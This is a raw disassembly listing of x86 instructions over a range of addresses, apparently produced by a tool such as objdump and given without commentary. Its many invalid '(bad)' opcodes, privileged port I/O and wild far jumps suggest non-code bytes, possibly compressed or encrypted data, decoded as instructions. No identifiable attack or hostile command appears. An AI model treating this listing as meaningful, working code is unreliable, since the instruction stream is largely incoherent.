  417b23:	jne    0x417b88
  417b25:	mov    BYTE PTR [eax+ecx*1-0x1],dh
  417b29:	sub    eax,0x89f0fffb
  417b2e:	mov    ah,0xf0
  417b30:	js     0x417aba
  417b32:	(bad)  
  417b33:	call   0x403e6f
  417b38:	jo     0x417adc
  417b3a:	cmc    
  417b3b:	jmp    0x417adb
  417b3d:	mov    BYTE PTR [esp+edi*8+0x2f],dh
  417b41:	cwde   
  417b42:	verr   WORD PTR [edi]
  417b45:	cwde   
  417b46:	mov    edi,0x8ab41710
  417b4b:	in     al,dx
  417b4c:	xchg   esp,eax
  417b4d:	and    edx,DWORD PTR [ecx+0xa124057]
  417b53:	call   0x404e1e
  417b58:	fcomp  QWORD PTR [eax]
  417b5a:	je     0x417b61
  417b5c:	mov    al,0x97
  417b5e:	mov    edi,0x4457e71c
  417b63:	xchg   esp,eax
  417b64:	dec    esp
  417b65:	or     ebx,DWORD PTR [edx]
  417b67:	pop    gs
  417b69:	mov    eax,ds:0x52e0500e
  417b6e:	inc    esi
  417b6f:	push   cs
  417b70:	push   edi
  417b71:	pop    eax
  417b72:	mov    dh,0x47
	...
  417b9c:	add    BYTE PTR [eax],al
  417b9e:	mov    ds:0x58b60ea8,al
  417ba3:	pop    ebx
  417ba4:	push   eax
  417ba5:	movaps XMMWORD PTR [ecx+0x5290500a],xmm4
  417bac:	inc    esi
  417bad:	or     dl,BYTE PTR [edi+0x58]
  417bb0:	mov    dh,0x47
  417bb2:	ds mov ebx,0x7dc80ed1
  417bb8:	cld    
  417bb9:	dec    edi
  417bba:	dec    ecx
  417bbb:	xchg   ebp,eax
  417bbc:	retf   0xe05
  417bbf:	lds    edi,FWORD PTR [edx+0x46]
  417bc2:	inc    edx
  417bc3:	jb     0x417bf6
  417bc5:	ss (bad) 
  417bc7:	sti    
  417bc8:	mov    ah,0x40
  417bca:	ds dec edi
  417bcc:	enter  0xee9b,0x29
  417bd0:	dec    esp
  417bd1:	adc    BYTE PTR [esi],bh
  417bd3:	ret    0xc386
  417bd6:	or     al,BYTE PTR [ecx-0x50]
  417bd9:	pop    ds
  417bda:	ds push ss
  417bdc:	mov    ebp,0x32aeabfe
  417be1:	je     0x417c31
  417be3:	sbb    al,BYTE PTR [eax]
  417be5:	and    DWORD PTR ss:[ebp-0x176d4002],eax
  417bec:	jl     0x417c32
  417bee:	mov    dh,0x74
  417bf0:	mov    eax,0x9f70907
  417bf5:	call   0xfe741c6e
  417bfa:	stc    
  417bfb:	push   esi
  417bfc:	xchg   ebp,eax
  417bfd:	(bad)  
  417bfe:	imul   edi,DWORD PTR [edx+0xa019],0x0
	...
  417c29:	add    BYTE PTR [eax],al
  417c2b:	add    BYTE PTR [ecx*8+0x267b8c2f],bl
  417c32:	sar    esi,1
  417c34:	push   ebx
  417c35:	pop    edx
  417c36:	sbb    al,0x94
  417c38:	sbb    al,0xb5
  417c3a:	das    
  417c3b:	(bad)  
  417c3c:	push   ebx
  417c3d:	dec    edx
  417c3e:	das    
  417c3f:	je     0x417c67
  417c41:	call   0x742f:0x9cb9217e
  417c48:	(bad)  
  417c49:	test   eax,0xca9249f
  417c4e:	sbb    al,0x2f
  417c50:	mov    eax,ds:0x13fefc8e
  417c55:	pop    ebx
  417c56:	call   FWORD PTR [ebx]
  417c58:	sub    al,0x79
  417c5a:	sahf   
  417c5b:	xor    DWORD PTR [eax+0xa317b4d],ecx
  417c61:	jae    0x417ce2
  417c63:	sahf   
  417c64:	pop    ds
  417c65:	aam    0x86
  417c67:	jg     0x417c63
  417c69:	not    BYTE PTR [edi]
  417c6b:	xor    edx,esi
  417c6d:	jb     0x417cee
  417c6f:	rcr    BYTE PTR [edi],cl
  417c71:	aam    0x6e
  417c73:	xor    edx,edx
  417c75:	outs   dx,BYTE PTR ds:[esi]
  417c76:	data16 mov bh,0x41
  417c79:	aam    0xd4
  417c7b:	or     edx,DWORD PTR [esi+0x7e]
  417c7e:	or     DWORD PTR [ecx],esi
  417c80:	inc    eax
  417c81:	rcl    esp,cl
  417c83:	xchg   edi,eax
  417c84:	and    DWORD PTR [ecx+0x3330310c],ecx
  417c8a:	xor    BYTE PTR [esi+0x45],al
  417c8d:	pop    ebx
  417c8e:	pushf  
  417c8f:	jl     0x417c91
	...
  417cb9:	add    BYTE PTR ds:0xc2823dd,dl
  417cbf:	shl    DWORD PTR [esi],cl
  417cc1:	xor    DWORD PTR [edx+0x9876c73],ecx
  417cc7:	xlat   BYTE PTR ds:[ebx]
  417cc8:	push   ss
  417cc9:	xor    DWORD PTR [ecx-0x2e],esi
  417ccc:	xchg   esp,eax
  417ccd:	sti    
  417cce:	loope  0x417d03
  417cd0:	push   esp
  417cd1:	xor    eax,esi
  417cd3:	shl    BYTE PTR [ebx+ecx*1-0x45],cl
  417cd7:	fsub   st,st(7)
  417cd9:	sub    esp,eax
  417cdb:	rcl    BYTE PTR [edi-0x19a0add0],cl
  417ce1:	mov    dh,0x39
  417ce3:	ret    
  417ce4:	ins    DWORD PTR es:[edi],dx
  417ce5:	pop    esi
  417ce6:	enter  0x41d2,0x4
  417cea:	push   esp
  417ceb:	pop    ebx
  417cec:	aas    
  417ced:	xor    DWORD PTR [ebx+ebx*2],edi
  417cf0:	out    0x7e,eax
  417cf2:	mov    edx,0xa830b35b
  417cf7:	sub    eax,DWORD PTR [eax]
  417cf9:	inc    ebx
  417cfa:	outs   dx,DWORD PTR ds:[esi]
  417cfb:	shl    DWORD PTR [ebx-0x27],1
  417cfe:	mov    ebx,0x35e967d2
  417d03:	test   BYTE PTR [eax],dl
  417d05:	jmp    0x99c51747
  417d0a:	dec    edx
  417d0b:	sar    ebp,1
  417d0d:	stc    
  417d0e:	cmp    eax,0xb8ae005b
  417d13:	into   
  417d14:	icebp  
  417d15:	jle    0x417d45
  417d17:	pop    esp
  417d18:	add    cl,ch
  417d1a:	cmp    eax,0x71839a
	...
  417d47:	add    BYTE PTR [edx],dl
  417d49:	sar    ebp,1
  417d4b:	jmp    0x2641d88d
  417d50:	rcl    dh,0xf1
  417d53:	push   esi
  417d54:	push   cs
  417d55:	sar    ch,cl
  417d57:	jmp    0xe1956399
  417d5c:	mov    dl,0x6c
  417d5e:	push   0xffffffe9
  417d60:	test   al,0xd7
  417d62:	lock cmp ch,BYTE PTR [esi-0x2f]
  417d66:	push   eax
  417d67:	pop    esp
  417d68:	rol    ch,0xf1
  417d6b:	es dec esi
  417d6d:	and    cl,BYTE PTR [ebx-0x232da9c]
  417d73:	push   ss
  417d74:	in     eax,dx
  417d75:	shl    BYTE PTR [ebx-0x7],1
  417d78:	cs inc edi
  417d7a:	or     al,0x6
  417d7c:	test   al,0x59
  417d7e:	push   0xffffffe9
  417d80:	cs inc edi
  417d82:	sbb    dh,dh
  417d84:	or     bl,BYTE PTR [esi]
  417d86:	sub    DWORD PTR [esi*1+0x3ae6fdcd],0x42d48462
  417d91:	pop    ebx
  417d92:	add    BYTE PTR [edx+0x4f],ch
  417d95:	(bad)  
  417d96:	icebp  
  417d97:	into   
  417d98:	imul   edx,edx,0x6f23000e
  417d9e:	std    
  417d9f:	call   DWORD PTR [edi+0x567161f5]
  417da5:	push   edi
  417da6:	mov    eax,DWORD PTR [ebp-0x17e59]
	...
  417dd4:	add    BYTE PTR [eax],al
  417dd6:	push   edi
  417dd7:	outs   dx,DWORD PTR ds:[esi]
  417dd8:	xlat   BYTE PTR ds:[ebx]
  417dd9:	seta   BYTE PTR [ebp-0x7d]
  417ddd:	shl    BYTE PTR [ebx],0x60
  417de0:	push   0xfd985673
  417de5:	mov    edx,fs
  417de7:	push   esi
  417de8:	cld    
  417de9:	(bad)  
  417dea:	call   0x59076395
  417def:	pop    ebp
  417df0:	add    BYTE PTR [ebp-0x507b2e59],al
  417df6:	addr16 pop ebp
  417df8:	add    bh,al
  417dfa:	loop   0x417d7e
  417dfc:	repnz (bad) 
  417dfe:	call   0xca307e66
  417e03:	out    dx,eax
  417e04:	jle    0x417e77
  417e06:	out    0x5c,al
  417e08:	mov    eax,DWORD PTR [ebp-0x17ae9]
  417e0e:	(bad)  
  417e0f:	je     0x417db0
  417e11:	(bad)  
  417e13:	pop    ebp
  417e14:	add    eax,0xffffffb3
  417e17:	mov    esi,0x8c4385c6
  417e1c:	(bad)  
  417e1d:	call   DWORD PTR [ecx]
  417e1f:	pop    ebp
  417e20:	in     eax,dx
  417e21:	mov    esi,0x4170dfbf
  417e26:	out    0xdb,eax
  417e28:	test   BYTE PTR [eax],al
  417e2a:	aas    
  417e2b:	cmp    dh,0x50
  417e2e:	aas    
  417e2f:	fmul   QWORD PTR [esi]
  417e31:	add    bh,ah
  417e33:	jecxz  0x417df2
  417e35:	je     0x417e6f
  417e37:	sbb    BYTE PTR [esp+eiz*8+0x0],al
	...
  417e62:	add    BYTE PTR [eax],al
  417e64:	in     al,0x81
  417e66:	inc    BYTE PTR [edi]
  417e68:	ds ret 0xbd1e
  417e6c:	es in  eax,dx
  417e6e:	mov    ah,0x40
  417e70:	ds inc edi
  417e72:	mov    bh,bh
  417e74:	mov    cl,0x11
  417e76:	das    
  417e77:	dec    edi
  417e78:	xchg   esi,eax
  417e79:	push   ds
  417e7a:	std    
  417e7b:	call   FWORD PTR [ecx-0x138bbec9]
  417e81:	inc    edx
  417e82:	jo     0x417e67
  417e84:	(bad)  
  417e85:	icebp  
  417e86:	cs push es
  417e88:	fldcw  WORD PTR ds:[ebx+0x74]
  417e8c:	and    bl,BYTE PTR [esp+eax*1-0x1]
  417e90:	jmp    0x417e57
  417e92:	cs je  0x417ee7
  417e95:	push   ecx
  417e96:	js     0x417e7f
  417e98:	ins    DWORD PTR es:[edi],dx
  417e99:	dec    ecx
  417e9a:	cs (bad) 
  417e9c:	xchg   ebx,eax
  417e9d:	dec    esi
  417e9e:	xor    bh,dh
  417ea0:	push   ecx
  417ea1:	cmp    DWORD PTR [eax+0x25e7490f],edi
  417ea7:	repnz inc ecx
  417ea9:	sub    DWORD PTR [ecx],ebx
  417eab:	call   0xac5c:0xea2e213b
  417eb2:	add    al,0xff
  417eb4:	mov    bl,0xbe
  417eb6:	cs je  0x417f03
  417eb9:	mov    DWORD PTR [eax-0x19],edi
  417ebc:	or     eax,0xcbfe2e81
  417ec1:	gs xor bh,dh
  417ec4:	or     DWORD PTR [ecx-0x48],esi
  417ec7:	sldt   WORD PTR [eax]
	...
  417ef2:	add    DWORD PTR [edi],ebp
  417ef4:	and    eax,0x1960f9f2
  417ef9:	jbe    0x417eee
  417efb:	pop    eax
  417efc:	cs (bad) 
  417efe:	mov    bl,0x5d
  417f00:	xor    bh,dh
  417f02:	loope  0x417f5d
  417f04:	xchg   edx,eax
  417f05:	push   cs
  417f06:	ds ret 0xc13c
  417f0a:	sub    bl,BYTE PTR [ebx-0x19]
  417f0d:	(bad)  
  417f0e:	mov    ah,0xbe
  417f10:	push   0x48
  417f12:	vunpcklps xmm4,xmm4,XMMWORD PTR [esp+eax*1+0x1a]
  417f18:	out    0x3,eax
  417f1a:	sub    dl,BYTE PTR [eax+0x5aa5c7ae]
  417f20:	out    0x3,eax
  417f22:	test   BYTE PTR ds:[edi+0x5c2b09d4],ah
  417f29:	xlat   BYTE PTR ds:[ebx]
  417f2a:	xchg   ebp,eax
  417f2b:	sub    al,0xa6
  417f2d:	pop    ss
  417f2e:	fisub  WORD PTR [ebx]
  417f30:	sub    BYTE PTR [ebx+edi*4],al
  417f33:	call   0xaf6a:0x7b650210
  417f3a:	jne    0x417f96
  417f3c:	cld    
  417f3d:	add    DWORD PTR [ebp+0x73],edx
  417f40:	lfs    ebp,FWORD PTR [edx+ebx*1-0x19]
  417f45:	sub    al,0xd2
  417f47:	into   
  417f48:	outs   dx,BYTE PTR ds:[esi]
  417f49:	mov    bh,0x39
  417f4b:	ret    
  417f4c:	and    ebx,DWORD PTR [edi+0x48]
  417f4f:	iret   
  417f50:	jb     0x417f29
  417f52:	inc    ebp
  417f53:	jecxz  0x417f4e
  417f55:	sub    al,0x0
	...
  417f7f:	add    BYTE PTR [edx+0x39d24ecf],dh
  417f85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f86:	sub    DWORD PTR [eax],ecx
  417f88:	sub    BYTE PTR ds:[edx+0x20],dh
  417f8c:	mov    esp,0x199a3397
  417f91:	inc    ebp
  417f92:	lea    ebp,[edx+ecx*4]
  417f95:	arpl   WORD PTR [edi],cx
  417f97:	leave  
  417f98:	sub    esi,ecx
  417f9a:	push   ds
  417f9b:	jnp    0x418017
  417f9d:	iret   
  417f9e:	push   ss
  417f9f:	mov    bh,0x41
  417fa1:	ret    
  417fa2:	js     0x417fd1
  417fa4:	lock into 
  417fa6:	(bad)  
  417fa7:	push   esp
  417fa8:	pop    eax
  417fa9:	sbb    al,0xe7
  417fab:	sub    al,0x2a
  417fad:	std    
  417fae:	add    BYTE PTR [ecx+0x74fecefc],ah
  417fb4:	aad    0xb6
  417fb6:	fwait
  417fb7:	loop   0x417fd3
  417fb9:	int    0x68
  417fbb:	mov    dh,0xa2
  417fbd:	sbb    eax,DWORD PTR [eax]
  417fbf:	inc    ecx
  417fc0:	xor    al,0x16
  417fc2:	aas    
  417fc3:	jmp    0xc668671d
  417fc8:	pop    edx
  417fc9:	push   ds
  417fca:	push   eax
  417fcb:	push   ecx
  417fcc:	ds dec ebx
  417fce:	aas    
  417fcf:	jmp    0x21f0073e
  417fd4:	jge    0x417fa4
  417fd6:	(bad)  
  417fd7:	sbb    al,0x8a
  417fd9:	mov    dh,0x18
  417fdb:	popf   
  417fdc:	push   edx
  417fdd:	int    0xe8
  417fdf:	mov    ch,0x5f
  417fe1:	int    0xfd
  417fe3:	add    eax,DWORD PTR [eax]
	...
  41800d:	add    BYTE PTR [edx],bh
  41800f:	inc    ebx
  418010:	push   edx
  418011:	clc    
  418012:	jl     0x417fe2
  418014:	gs (bad) 
  418016:	lods   al,BYTE PTR ds:[esi]
  418017:	sbb    eax,DWORD PTR [eax]
  418019:	add    DWORD PTR [ebx+ebx*2],edi
  41801c:	add    BYTE PTR [ecx+0x35],ch
  41801f:	mov    al,0x23
  418021:	data16 sbb ah,BYTE PTR [ecx-0x40]
  418025:	aad    0x5d
  418027:	ss pop edx
  418029:	fdivr  st,st(4)
  41802b:	int    0x4d
  41802d:	inc    ecx
  41802e:	xchg   edi,eax
  41802f:	js     0x41802e
  418031:	inc    esi
  418032:	or     eax,0x83f4fd1e
  418037:	push   ss
  418038:	aas    
  418039:	jmp    0x4149c7a8
  41803e:	and    dl,cl
  418040:	std    
  418041:	es and eax,0x521e22fc
  418047:	ss adc eax,0xfecdfc99
  41804d:	aam    0x93
  41804f:	push   ss
  418050:	aas    
  418051:	add    bh,dl
  418053:	jle    0x4180c9
  418055:	or     BYTE PTR [edi-0x49],cl
  418058:	cli    
  418059:	call   eax
  41805b:	repnz std 
  41805d:	addr16 test eax,0xe0004109
  418063:	retf   
  418064:	stos   DWORD PTR es:[edi],eax
  418065:	dec    eax
  418066:	push   ss
  418067:	push   edi
  418068:	std    
  418069:	jne    0x41800a
  41806b:	jno    0x41801d
  41806d:	sti    
  41806e:	add    BYTE PTR [ecx+0x67],0x0
	...
  418099:	add    BYTE PTR [eax],al
  41809b:	add    BYTE PTR [edi],cl
  41809d:	xchg   ebx,eax
  41809e:	ins    DWORD PTR es:[edi],dx
  41809f:	inc    ecx
  4180a0:	xchg   edi,eax
  4180a1:	xor    BYTE PTR [esi+ebp*4],0x5f
  4180a5:	cwde   
  4180a6:	std    
  4180a7:	dec    BYTE PTR [edx-0x31]
  4180aa:	in     eax,0x9c
  4180ac:	fadd   QWORD PTR [ecx-0x7cd50002]
  4180b2:	(bad)  
  4180b3:	jne    0x418114
  4180b5:	jno    0x41808c
  4180b7:	pop    ds
  4180b8:	rol    BYTE PTR [ecx+0x595bc2c8],0x53
  4180bf:	mov    esi,DWORD PTR [ebx-0x2e0b3e29]
  4180c5:	cmp    esi,0x5eef676a
  4180cb:	jmp    FWORD PTR [edx-0x2f]
  4180ce:	in     eax,0x79
  4180d0:	inc    eax
  4180d1:	cmp    dh,0x89
  4180d4:	jmp    0x40f9:0xa05c674
  4180db:	add    BYTE PTR ds:0x92000059,dl
  4180e1:	(bad)  
  4180e3:	(bad)  
  4180e4:	push   eax
  4180e5:	or     BYTE PTR [ebp+0x68],0x1b
  4180e9:	pop    eax
  4180ea:	add    BYTE PTR [eax],al
  4180ec:	das    
  4180ed:	je     0x4180fb
  4180ef:	add    BYTE PTR [edi],dl
  4180f1:	icebp  
  4180f2:	add    al,0x72
  4180f4:	add    eax,DWORD PTR ds:[edx]
  4180f7:	push   0xffc4f3f7
  4180fc:	popa   
  4180fd:	in     al,dx
  4180fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180ff:	inc    eax
	...
  418128:	add    BYTE PTR [eax],al
  41812a:	ds int 0xf0
  41812d:	lods   eax,DWORD PTR ds:[esi]
  41812e:	xchg   BYTE PTR [ebx],al
  418130:	add    bh,bh
  418132:	dec    ebx
  418133:	mov    edx,0xb59ddb19
  418138:	sub    ah,BYTE PTR [edi+0x3b]
  41813b:	xor    bl,al
  41813d:	jmp    DWORD PTR [ecx]
  41813f:	stos   DWORD PTR es:[edi],eax
  418140:	mov    ah,0x40
  418142:	ds sbb dl,dl
  418145:	pusha  
  418146:	inc    ecx
  418148:	cdq    
  418149:	add    DWORD PTR [esi],edi
  41814b:	ret    0xfe81
  41814e:	adc    edi,DWORD PTR [edx-0x22240e7]
  418154:	sub    cl,BYTE PTR [ebx+eax*8-0x7e01d813]
  41815b:	xchg   edx,eax
  41815c:	sbb    al,0x8b
  41815e:	dec    ebx
  41815f:	ret    0xc701
  418162:	cmp    esp,DWORD PTR [edi-0x5c]
  418165:	inc    eax
  418166:	rol    DWORD PTR ds:[ecx],0x0
  41816a:	ds aas 
  41816c:	xor    dh,0x58
  41816f:	inc    ebp
  418170:	sub    cl,BYTE PTR [edi-0x1a]
  418173:	mov    ch,0x4
  418175:	add    BYTE PTR [esi],bh
  418177:	sub    al,BYTE PTR [esi-0x663dc1f4]
  41817d:	add    al,0xac
  41817f:	add    eax,DWORD PTR [edx]
  418181:	push   0xffc4b337
  418186:	mov    eax,ds:0x3e40a4ec
  41818b:	(bad)  
  41818c:	lock lods eax,DWORD PTR ds:[esi]
	...
  4181b6:	add    BYTE PTR [eax],al
  4181b8:	xchg   BYTE PTR [ebx],al
  4181ba:	add    bh,bh
  4181bc:	mov    edi,DWORD PTR [edx+0x5add7b19]
  4181c2:	sub    bl,BYTE PTR es:[ecx-0x63b66aa]
  4181c9:	xor    edx,DWORD PTR [eax]
  4181cb:	mov    ah,0x7e
  4181cd:	pop    ebx
  4181ce:	jg     0x4181a1
  4181d0:	pop    esi
  4181d1:	sbb    ah,bh
  4181d3:	fwait
  4181d4:	aas    
  4181d5:	pop    ebx
  4181d6:	out    0x83,eax
  4181d8:	fadd   DWORD PTR [ebp-0x21]
  4181db:	sbb    esi,DWORD PTR [ecx-0x8]
  4181de:	out    dx,al
  4181df:	sub    DWORD PTR [edx-0x3fd5212b],edi
  4181e5:	retf   
  4181e6:	aaa    
  4181e7:	sbb    al,0x65
  4181e9:	pop    esi
  4181ea:	out    0x3,eax
  4181ec:	mov    cl,0x45
  4181ee:	retf   
  4181ef:	sub    DWORD PTR [edx],esi
  4181f1:	arpl   di,cx
  4181f3:	xor    eax,DWORD PTR [ebx-0x34]
  4181f6:	mov    esi,0xe7567f3b
  4181fb:	into   
  4181fc:	les    edi,FWORD PTR [esi+0x2385406a]
  418202:	aaa    
  418203:	int3   
  418204:	sbb    DWORD PTR [edi],edx
  418206:	xchg   esi,eax
  418207:	les    edi,FWORD PTR [ecx-0x3d]
  41820a:	sbb    DWORD PTR [ebx],eax
  41820c:	jge    0x4181d9
  41820e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41820f:	mov    edi,0x3e75a65
  418214:	ds or  al,0xda
  418217:	mov    ch,0xfe
  418219:	pop    edx
  41821a:	jbe    0x4181cb
	...
  418244:	add    BYTE PTR [eax],al
  418246:	cmp    esp,ebx
  418248:	in     al,0x8d
  41824a:	int3   
  41824b:	sbb    edi,esp
  41824d:	lahf   
  41824e:	sahf   
  41824f:	mov    ah,bh
  418251:	add    edi,DWORD PTR [esi]
  418253:	fcmovne st,st(7)
  418255:	add    eax,0x28df4f3e
  41825a:	mov    dl,0x53
  41825c:	dec    edi
  41825d:	jbe    0x4182a8
  41825f:	retf   0x1b3e
  418262:	rcr    DWORD PTR [ebx+0x0],1
  418265:	jmp    0x41c35a7
  41826a:	push   edi
  41826b:	leave  
  41826c:	std    
  41826d:	pushf  
  41826e:	add    eax,0x26fc89c3
  418273:	leave  
  418274:	mov    eax,ds:0x1bab7f
  418279:	test   DWORD PTR [esi],edx
  41827b:	pop    DWORD PTR [eax]
  41827d:	jmp    0x25caddbf
  418282:	sahf   
  418283:	leave  
  418284:	xor    ebp,ecx
  418286:	cmp    eax,0xed94005b
  41828b:	inc    edx
  41828c:	and    cl,ah
  41828e:	std    
  41828f:	retf   0xc065
  418292:	outs   dx,BYTE PTR ds:[esi]
  418293:	mov    al,BYTE PTR [eax]
  418295:	cmp    esi,ebx
  418297:	shl    DWORD PTR [ebx],cl
  418299:	jmp    0xc641dddb
  41829e:	shl    BYTE PTR [edx-0x3],1
  4182a1:	(bad)  
  4182a2:	mov    esp,0x7a2d3e89
  4182a7:	retf   0xce71
	...
  4182d2:	add    BYTE PTR [eax],al
  4182d4:	ret    0x10d2
  4182d7:	sbb    eax,0x9d43a185
  4182dc:	cmp    al,0x5b
  4182de:	add    cl,ch
  4182e0:	push   edx
  4182e1:	imul   edi,ebp,0xffffffd4
  4182e4:	iret   
  4182e5:	dec    ebp
  4182e6:	aas    
  4182e7:	jmp    0xfadc1202
  4182ec:	jl     0x4182b8
  4182ee:	in     eax,0x7d
  4182f0:	inc    ebx
  4182f1:	retf   0x6afd
  4182f4:	or     DWORD PTR [edx-0x17],esi
  4182f7:	scas   al,BYTE PTR es:[edi]
  4182f8:	jo     0x4182cf
  4182fa:	in     al,dx
  4182fb:	jb     0x418305
  4182fd:	push   esi
  4182fe:	mov    DWORD PTR [ebp+ecx*2-0x591e8d36],ebp
  418305:	dec    edx
  418306:	mov    eax,0x5e1700
  41830b:	call   ebp
  41830d:	ror    DWORD PTR [esi+0x5e6380],1
  418313:	add    BYTE PTR [eax+0x10],bl
  418316:	push   cs
  418317:	(bad)  
  418318:	xchg   edi,eax
  418319:	cmp    bh,ch
  41831b:	jmp    edi
  41831d:	fidivr WORD PTR [edx+ebx*4]
  418320:	aam    0x9c
  418322:	std    
  418323:	call   ebx
  418325:	ins    BYTE PTR es:[edi],dx
  418326:	std    
  418327:	xor    eax,0x410f81
  41832c:	fdiv   DWORD PTR [edi+0x5da67397]
  418332:	call   0xfeb470e8
  418337:	mov    eax,0x0
	...
  418360:	add    BYTE PTR [eax],al
  418362:	xlat   BYTE PTR ds:[ebx]
  418363:	pop    ebp
  418364:	add    BYTE PTR [eax],al
  418366:	jp     0x418385
  418368:	and    DWORD PTR [eax],eax
  41836a:	add    edx,DWORD PTR [edx+0x4]
  41836d:	add    BYTE PTR [edi-0x2f7cffa3],dl
  418373:	pop    edx
  418374:	cmp    DWORD PTR [edi],0x3f84d0a7
  41837a:	enter  0xfe81,0x8b
  41837e:	bound  esi,QWORD PTR [ebx+0x5e]
  418381:	leave  
  418382:	aad    0x5a
  418384:	add    BYTE PTR [ebp-0x14],dl
  418387:	bound  eax,QWORD PTR [edx+0x4d98cbc4]
  41838d:	pop    eax
  41838e:	aas    
  41838f:	adc    esi,esi
  418391:	inc    eax
  418392:	push   edi
  418393:	jne    0x418404
  418395:	add    DWORD PTR [ecx+eax*4-0x78233676],esp
  41839c:	sub    dh,dh
  41839e:	fadd   QWORD PTR [edi-0x4487059b]
  4183a4:	add    BYTE PTR [ebx-0x3bbaf92],cl
  4183aa:	ds cmp eax,0x3d44ea3b
  4183b0:	cmp    eax,DWORD PTR [edx]
  4183b2:	clc    
  4183b3:	dec    ebp
  4183b4:	cmp    ecx,DWORD PTR [edi-0x3b]
  4183b7:	mov    ebx,DWORD PTR [edi+edi*8]
  4183ba:	inc    ebp
  4183bb:	mov    dl,0x1
  4183bd:	mov    esi,edi
  4183bf:	jmp    0xc879:0x743dc87a
	...
  4183ee:	add    BYTE PTR [eax],al
  4183f0:	stc    
  4183f1:	mul    DWORD PTR ds:0x46e7382
  4183f7:	jne    0x4183d7
  4183f9:	clc    
  4183fa:	cmp    al,0xc2
  4183fc:	mov    ecx,DWORD PTR [ebp+0x18]
  4183ff:	dec    edi
  418400:	jbe    0x4183ec
  418402:	mov    esi,edi
  418404:	jle    0x4183b8
  418406:	sub    DWORD PTR [ecx+0x3f],esi
  418409:	jne    0x418430
  41840b:	mov    bh,BYTE PTR [ebx-0x36]
  41840e:	cli    
  41840f:	mov    edi,0x41ab632
  418414:	mov    al,0xba
  418416:	and    eax,DWORD PTR [edi]
  418418:	(bad)  
  418419:	xor    ecx,ebp
  41841b:	jmp    FWORD PTR [edx]
  41841d:	or     BYTE PTR ds:0xd0b242c1,bh
  418423:	mov    ah,BYTE PTR [edx-0x120cc2cb]
  418429:	popa   
  41842a:	int3   
  41842b:	addr16 jle 0x418428
  41842e:	sar    edi,0x71
  418431:	fs add eax,ebx
  418434:	jno    0x41842f
  418436:	shl    bl,0x3e
  418439:	mov    dl,0x1
  41843b:	add    BYTE PTR ds:0x5a4478fd,dl
  418441:	bound  esp,QWORD PTR ds:0x3eda4674
  418447:	or     bh,BYTE PTR [esi]
  418449:	mov    dl,0x80
  41844b:	mov    edi,0x271c5ac6
  418450:	mov    dl,0x53
  418452:	dec    edi
  418453:	mov    al,BYTE PTR [eax]
	...
  41847d:	add    BYTE PTR [eax-0x38],cl
  418480:	push   esi
  418481:	jl     0x418405
  418483:	ret    
  418484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418485:	rcr    DWORD PTR [ecx],cl
  418487:	xchg   edi,eax
  418488:	out    0x26,al
  41848a:	sbb    dl,dl
  41848c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41848d:	das    
  41848e:	adc    BYTE PTR [esi+0x33],cl
  418491:	sbb    eax,ebx
  418493:	push   esp
  418494:	out    0x3,eax
  418496:	xor    eax,0xf90f9b9b
  41849b:	dec    ebp
  41849c:	pop    ds
  41849d:	es push 0xffffffcf
  4184a0:	mov    bh,0x1b
  4184a2:	loope  0x41850b
  4184a4:	push   cs
  4184a5:	es loopne 0x4184f5
  4184a8:	add    ebx,DWORD PTR [ebx]
  4184aa:	dec    ebp
  4184ab:	push   ebp
  4184ac:	out    0x3,eax
  4184ae:	ror    DWORD PTR [ebp-0x21],1
  4184b1:	sbb    ecx,DWORD PTR [ebp+0x62]
  4184b4:	out    dx,al
  4184b5:	and    eax,0x4db45bc
  4184ba:	xor    ch,BYTE PTR [ecx+0x4f]
  4184bd:	jb     0x4184eb
  4184bf:	sbb    ah,bh
  4184c1:	and    al,0x32
  4184c3:	iret   
  4184c4:	mov    edi,0xe75b3419
  4184c9:	clc    
  4184ca:	(bad)  [esi-0x1c]
  4184cd:	push   0x3e75b3e
  4184d2:	mov    DWORD PTR [ebp-0x4d],ecx
  4184d5:	sbb    al,0x1b
  4184d7:	push   0x9bc425a6
  4184dc:	inc    edx
  4184dd:	cmp    edi,DWORD PTR [edi+0x5e]
  4184e0:	out    0xce,eax
	...
  41850a:	add    BYTE PTR [eax],al
  41850c:	mov    ah,0xb6
  41850e:	aaa    
  41850f:	int3   
  418510:	fldcw  WORD PTR [edx]
  418512:	add    ah,0x59
  418515:	iret   
  418516:	stc    
  418517:	add    bh,BYTE PTR [ebp-0x39]
  41851a:	add    BYTE PTR [esi-0x67],dh
  41851d:	pop    edi
  41851e:	call   0xfe09ba5b
  418523:	shl    DWORD PTR ds:0xfcb0ff3f,cl
  418529:	(bad)  
  41852a:	(bad)  
  41852b:	fsub   QWORD PTR ds:0x5af2fdbf
  418531:	lds    ebp,FWORD PTR [edx-0xf]
  418534:	mov    ch,0x7c
  418536:	dec    eax
  418537:	test   al,0x3d
  418539:	(bad)  
  41853a:	jae    0x41851d
  41853c:	and    eax,0x5b2e19b6
  418541:	lds    esi,FWORD PTR [ebx-0xf]
  418544:	push   ebp
  418545:	or     esp,edi
  418547:	push   ds
  418548:	sbb    ecx,DWORD PTR [esi]
  41854a:	add    cl,ch
  41854c:	cmp    eax,0x3e2bc75b
  418551:	pop    ebx
  418552:	push   ebx
  418553:	jb     0x41858b
  418555:	fld    st(4)
  418557:	add    edx,ebp
  418559:	cs push 0x861550
  41855f:	icebp  
  418560:	(bad)  
  418561:	pop    ebx
  418562:	shl    esi,0x62
  418565:	dec    edi
  418566:	or     al,0xde
  418568:	loopne 0x4185c8
  41856a:	call   0xfe07c614
  41856f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  418598:	add    BYTE PTR [eax],al
  41859a:	loopne 0x41855e
  41859c:	(bad)  
  41859d:	call   0x24cce0df
  4185a2:	bound  edx,QWORD PTR [esi]
  4185a4:	push   0x1bce8f
  4185a9:	rol    DWORD PTR [eax],0x72
  4185ac:	std    
  4185ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185ae:	jbe    0x4185b6
  4185b0:	jne    0x41857d
  4185b2:	(bad)  
  4185b3:	fnstcw WORD PTR [ebx-0x6f]
  4185b6:	dec    ebp
  4185b7:	push   eax
  4185b8:	push   ss
  4185b9:	add    ecx,DWORD PTR [edx+0x2b]
  4185bc:	std    
  4185bd:	add    BYTE PTR [edx-0x32],bl
  4185c0:	in     eax,0x38
